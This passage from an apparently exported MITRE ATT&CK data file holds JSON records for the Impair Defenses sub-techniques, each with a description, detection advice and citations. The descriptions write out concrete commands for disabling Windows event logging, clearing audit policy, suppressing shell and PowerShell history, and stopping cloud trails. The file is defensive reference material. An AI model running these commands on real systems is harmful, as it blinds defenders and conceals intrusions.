bypassed":"Anti-virus, Digital Certificate Validation, File monitoring, Firewall, Host forensic analysis, Host intrusion prevention systems, Log analysis, Signature-based detection","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1562.008","name":"Impair Defenses: Disable Cloud Logs","description":"An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)","url":"https://attack.mitre.org/techniques/T1562/008","created":"12 October 2020","last modified":"20 April 2023","version":"1.3","tactics":"Defense Evasion","detection":"Monitor logs for API calls to disable logging. In AWS, monitor for: <code>StopLogging</code> and <code>DeleteTrail</code>.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs)  In Azure, monitor for <code>az monitor diagnostic-settings delete</code>.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled. ","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":null,"contributors":"Alex Soler, AttackIQ; Ibrahim Ali Khan; Janantha Marasinghe; Joe Gumke, U.S. Bank; Matt Snyder, VMware; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1562.002","name":"Impair Defenses: Disable Windows Event Logging","description":"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.","url":"https://attack.mitre.org/techniques/T1562/002","created":"21 February 2020","last modified":"17 March 2023","version":"1.2","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  \n\nIn Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\n\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)","platforms":"Windows","data sources":"Application Log: Application Log Content, Command: Command Execution, Process: Process Creation, Script: Script Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Creation","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Log analysis","contributors":"Lucas Heiligenstein; Prasanth Sadanala, Cigna Information Protection (CIP) - Threat Response Engineering Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: DFIR Phosphorus November 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Wevtutil Microsoft Documentation),(Citation: def_ev_win_event_logging),(Citation: win_xml_evt_log)"}
{"ID":"T1562.007","name":"Impair Defenses: Disable or Modify Cloud Firewall","description":"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.","url":"https://attack.mitre.org/techniques/T1562/007","created":"24 June 2020","last modified":"15 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Monitor cloud logs for modification or creation of new security groups or firewall rules.","platforms":"IaaS","data sources":"Firewall: Firewall Disable, Firewall: Firewall Rule Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":null,"contributors":"Expel","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Expel IO Evil in AWS)"}
{"ID":"T1562.004","name":"Impair Defenses: Disable or Modify System Firewall","description":"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)","url":"https://attack.mitre.org/techniques/T1562/004","created":"21 February 2020","last modified":"28 February 2023","version":"1.1","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Firewall","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Zscaler Kasidet),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: Novetta Blockbuster Loaders),(Citation: Talos Rocke August 2018),(Citation: ESET InvisiMole June 2018),(Citation: US-CERT TA18-074A),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: US-CERT HARDRAIN March 2018),(Citation: ESET Grandoreiro April 2020),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Cisco H1N1 Part 2),(Citation: Novetta Blockbuster Tools),(Citation: FireEye APT30),(Citation: Fidelis njRAT June 2013),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: TechNet Netsh Firewall),(Citation: NCSC Cyclops Blink February 2022),(Citation: US-CERT BADCALL),(Citation: Novetta Blockbuster),(Citation: Aqua TeamTNT August 2020),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Talos ZxShell Oct 2014),(Citation: Group-IB Anunak),(Citation: DFIR Phosphorus November 2021),(Citation: Securelist Kimsuky Sept 2013),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Trend Micro njRAT 2018),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Malwarebytes DarkComet March 2018),(Citation: TechNet Netsh),(Citation: DigiTrust NanoCore Jan 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1562.001","name":"Impair Defenses: Disable or Modify Tools","description":"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)","url":"https://attack.mitre.org/techniques/T1562/001","created":"21 February 2020","last modified":"12 April 2023","version":"1.4","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\n\nLack of expected log events may be suspicious.","platforms":"Containers, IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, Driver: Driver Load, Process: Process Termination, Sensor Health: Host Status, Service: Service Metadata, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Anti-virus, File monitoring, Host intrusion prevention systems, Log analysis, Signature-based detection","contributors":"Alex Soler, AttackIQ; Cian Heasley; Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Gal Singer, @galsinger29, Team Nautilus Aqua Security; Gordon Long, Box, Inc., @ethicalhax; Lucas Heiligenstein; Nathaniel Quist, Palo Alto Networks; Sarathkumar Rajendran, Microsoft Defender365; Ziv Karliner, @ziv_kr, Team Nautilus Aqua Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: objsee mac malware 2017),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Fortinet Agent Tesla June 2017),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: wardle evilquest parti),(Citation: Sophos Netwalker May 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Talos Promethium June 2020),(Citation: McAfee Night Dragon),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ESET Gamaredon June 2020),(Citation: Symantec WastedLocker June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: McAfee Gold Dragon),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Cisco Talos Intelligence Group),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Forcepoint Monsoon),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Unit 42 WhisperGate January 2022),(Citation: Talos Kimsuky Nov 2021),(Citation: Cisco H1N1 Part 2),(Citation: Novetta Blockbuster Tools),(Citation: CERT-FR PYSA April 2020),(Citation: Baumgartner Naikon 2015),(Citation: Trend Micro Tick November 2019),(Citation: FireEye Ransomware Feb 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Sophos Maze VM September 2020),(Citation: CrowdStrike Putter Panda),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Fortinet Diavol July 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Novetta Blockbuster Loaders),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Talos Rocke August 2018),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Talos ZxShell Oct 2014),(Citation: Prevx Carberp March 2011),(Citation: Cylance Sodinokibi July 2019),(Citation: IBM MegaCortex),(Citation: DFIR Ryuk's Return October 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: Donut Github),(Citation: Wired Lockergoga 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Trend Micro Skidmap),(Citation: McAfee Maze March 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Imminent Unit42 Dec2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Group IB Ransomware September 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Dragos EKANS),(Citation: Unit 42 Hildegard Malware),(Citation: Cybereason Clop Dec 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Sophos Ragnar May 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: Check Point Meteor Aug 2021),(Citation: Cylance Cleaver),(Citation: CarbonBlack RobbinHood May 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: Malwarebytes DarkComet March 2018),(Citation: SANS Conficker),(Citation: DigiTrust NanoCore Jan 2017),(Citation: ESET Ebury Oct 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1562.010","name":"Impair Defenses: Downgrade Attack","description":"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)\n\nAdversaries may downgrade and use less-secure versions of various features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557).(Citation: Praetorian TLS Downgrade Attack 2014)","url":"https://attack.mitre.org/techniques/T1562/010","created":"08 October 2021","last modified":"19 May 2022","version":"1.1","tactics":"Defense Evasion","detection":"Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: <code>powershell –v 2</code>). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment.\n\nMonitor for Windows event ID (EID) 400, specifically the <code>EngineVersion</code> field which shows the version of PowerShell running and may highlight a malicious downgrade attack.(Citation: inv_ps_attacks)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":null,"contributors":"Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Mayuresh Dani, Qualys","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1562.003","name":"Impair Defenses: Impair Command History Logging","description":"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).","url":"https://attack.mitre.org/techniques/T1562/003","created":"21 February 2020","last modified":"30 March 2023","version":"2.2","tactics":"Defense Evasion","detection":"Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code>, <code>HISTFILE</code>, or <code>HISTFILESIZE</code> environment variables may be suspicious.\n\nMonitor for modification of PowerShell command history settings through processes being created with <code>-HistorySaveStyle SaveNothing</code> command-line arguments and use of the PowerShell commands <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> and <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to clear or disable historical log data with built-in features native to the network device platform.  Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Host forensic analysis, Log analysis","contributors":"Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Securing bash history)"}
{"ID":"T1562.006","name":"Impair Defenses: Indicator Blocking","description":"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).","url":"https://attack.mitre.org/techniques/T1562/006","created":"19 March 2020","last modified":"12 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.\n\nDepending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}</code>","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Anti-virus, Host intrusion prevention systems","contributors":"Lucas Heiligenstein; Rob Smith","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Ebury Feb 2014),(Citation: Trend Micro Waterbear December 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: MDSec Brute Ratel August 2022),(Citation: Microsoft ETW May 2018)"}
{"ID":"T1562.009","name":"Impair Defenses: Safe Mode Boot","description":"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)","url":"https://attack.mitre.org/techniques/T1562/009","created":"23 June 2021","last modified":"31 August 2021","version":"1.0","tactics":"Defense Evasion","detection":"Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a <code>\\*</code> in front of the \"Startup\" value name: <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[\"\\*Startup\"=\"{Path}\"]</code> or by adding a key to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019)\n\nMonitor execution of processes and commands associated with making configuration changes to boot settings, such as <code>bcdedit.exe</code> and <code>bootcfg.exe</code>.(Citation: Microsoft bcdedit 2021)(Citation: Microsoft Bootcfg)(Citation: Sophos Snatch Ransomware 2019)","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":"Anti-virus, Host Intrusion Prevention Systems","contributors":"Jorell Magtibay, National Australia Bank Limited; Kiyohito Yamamoto, RedLark, NTT Communications; Yusuke Kubo, RedLark, NTT Communications","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Minerva Labs Black Basta May 2022),(Citation: Costa AvosLocker May 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Avertium Black Basta June 2022),(Citation: Cyble Black Basta May 2022),(Citation: Trend Micro Black Basta May 2022),(Citation: BleepingComputer REvil 2021),(Citation: CyberArk Labs Safe Mode 2016)"}
{"ID":"T1562.011","name":"Impair Defenses: Spoof Security Alerting","description":"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)","url":"https://attack.mitre.org/techniques/T1562/011","created":"14 March 2023","last modified":"12 April 2023","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Process: Process Creation, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1562","defenses bypassed":null,"contributors":"Goldstein Menachem","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
